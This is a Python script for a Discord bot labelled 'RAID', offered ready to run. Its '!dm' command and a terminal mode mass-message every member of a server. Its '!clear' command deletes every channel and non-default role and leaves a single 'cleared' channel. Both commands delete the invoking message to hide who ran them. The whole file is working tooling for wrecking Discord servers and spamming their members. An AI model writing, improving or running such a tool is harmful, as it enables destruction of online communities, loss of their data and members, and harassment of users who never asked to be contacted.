import discord
from discord.ext import commands
import asyncio
import logging

# -----------------------------
# ADVANCED TERMINAL LOGGING
# -----------------------------
logger = logging.getLogger("RAID")
logger.setLevel(logging.INFO)

handler = logging.StreamHandler()
formatter = logging.Formatter(
    "%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
handler.setFormatter(formatter)
logger.addHandler(handler)

# -----------------------------
# BOT SETUP
# -----------------------------
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())


# ============================================================
# COG: RAID (DM + CLEAR)
# ============================================================
class Raid(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # ---------------------------------------------------------
    # !DM COMMAND
    # ---------------------------------------------------------
    @commands.command(name="dm")
    async def dm(self, ctx, *, message: str):
        """DM all users in the server with a 5 second delay."""

        try:
            await ctx.message.delete()
        except:
            logger.warning("Could not delete !dm command message.")

        guild = ctx.guild
        logger.info(f"Starting DM broadcast in guild: {guild.name} (ID: {guild.id})")

        sent = 0
        failed = 0

        for member in guild.members:
            if member.bot:
                logger.info(f"Skipping bot: {member.name}")
                continue

            try:
                await member.send(message)
                logger.info(f"DM sent → {member.name} (ID: {member.id})")
                sent += 1
                await asyncio.sleep(5)

            except discord.Forbidden:
                logger.warning(f"Forbidden → Cannot DM {member.name}")
                failed += 1

            except discord.HTTPException as e:
                logger.error(f"HTTP Error → {member.name}: {e}")
                failed += 1

            except Exception as e:
                logger.error(f"Unknown Error → {member.name}: {e}")
                failed += 1

        logger.info(f"DM broadcast completed. Sent: {sent}, Failed: {failed}")

        try:
            await ctx.author.send(f"DM broadcast finished.\nSent: {sent}\nFailed: {failed}")
        except:
            logger.warning("Could not DM the author with results.")

    # ---------------------------------------------------------
    # !CLEAR COMMAND
    # ---------------------------------------------------------
    @commands.command(name="clear")
    async def clear(self, ctx):
        """Delete all channels + roles and recreate one channel."""

        try:
            await ctx.message.delete()
        except:
            logger.warning("Could not delete !clear command message.")

        guild = ctx.guild
        logger.info(f"Starting CLEAR in guild: {guild.name} (ID: {guild.id})")

        # Delete channels
        for channel in guild.channels:
            try:
                await channel.delete()
                logger.info(f"Deleted channel → {channel.name}")
            except Exception as e:
                logger.error(f"Failed to delete channel {channel.name}: {e}")

        # Delete roles
        for role in guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
                logger.info(f"Deleted role → {role.name}")
            except Exception as e:
                logger.error(f"Failed to delete role {role.name}: {e}")

        # Create new channel
        try:
            new_channel = await guild.create_text_channel("cleared")
            await new_channel.send("server clear")
            logger.info("Created new channel and sent message.")
        except Exception as e:
            logger.error(f"Failed to create new channel: {e}")

        try:
            await ctx.author.send("Server clear completed.")
        except:
            logger.warning("Could not DM the author with results.")


# Add cog
async def setup_cog():
    await bot.add_cog(Raid(bot))


# ============================================================
# TERMINAL COMMANDS (DM + CLEAR)
# ============================================================
async def terminal_commands():
    await bot.wait_until_ready()
    print("Terminal control ready.")

    while True:
        cmd = input("").strip().lower()

        # ---------------- TERMINAL DM ----------------
        if cmd == "dm":
            print("Enter server ID:")
            server_id = input("").strip()

            try:
                server_id = int(server_id)
            except:
                print("Invalid server ID.")
                continue

            guild = bot.get_guild(server_id)
            if guild is None:
                print("Bot is not in that server.")
                continue

            print("Enter your message. End with '.' on its own line.")

            lines = []
            while True:
                line = input()
                if line.strip() == ".":
                    break
                lines.append(line)

            message_text = "\n".join(lines)

            print("Sending DM broadcast...")

            sent = 0
            failed = 0

            for member in guild.members:
                if member.bot:
                    print(f"Skipping bot: {member.name}")
                    continue

                try:
                    await member.send(message_text)
                    print(f"Sent DM to {member.name}")
                    sent += 1
                    await asyncio.sleep(5)

                except Exception as e:
                    print(f"Failed DM to {member.name}: {e}")
                    failed += 1

            print(f"Finished. Sent: {sent}, Failed: {failed}")

        # ---------------- TERMINAL CLEAR ----------------
        if cmd == "clear":
            print("Enter server ID:")
            server_id = input("").strip()

            try:
                server_id = int(server_id)
            except:
                print("Invalid server ID.")
                continue

            guild = bot.get_guild(server_id)
            if guild is None:
                print("Bot is not in that server.")
                continue

            print("Enter '.' to confirm clearing the server.")
            confirm = input("").strip()

            if confirm != ".":
                print("Cancelled.")
                continue

            print("Clearing server...")

            # Delete channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"Deleted channel → {channel.name}")
                except Exception as e:
                    print(f"Failed to delete channel {channel.name}: {e}")

            # Delete roles
            for role in guild.roles:
                if role.is_default():
                    continue
                try:
                    await role.delete()
                    print(f"Deleted role → {role.name}")
                except Exception as e:
                    print(f"Failed to delete role {role.name}: {e}")

            # Create new channel
            try:
                new_channel = await guild.create_text_channel("cleared")
                await new_channel.send("server clear")
                print("Created new channel and sent message.")
            except Exception as e:
                print(f"Failed to create new channel: {e}")

            print("Server clear completed.")


# ============================================================
# BOT STARTUP
# ============================================================
async def main():
    await setup_cog()
    asyncio.create_task(terminal_commands())
    await bot.start("YOUR_TOKEN_HERE")


asyncio.run(main())
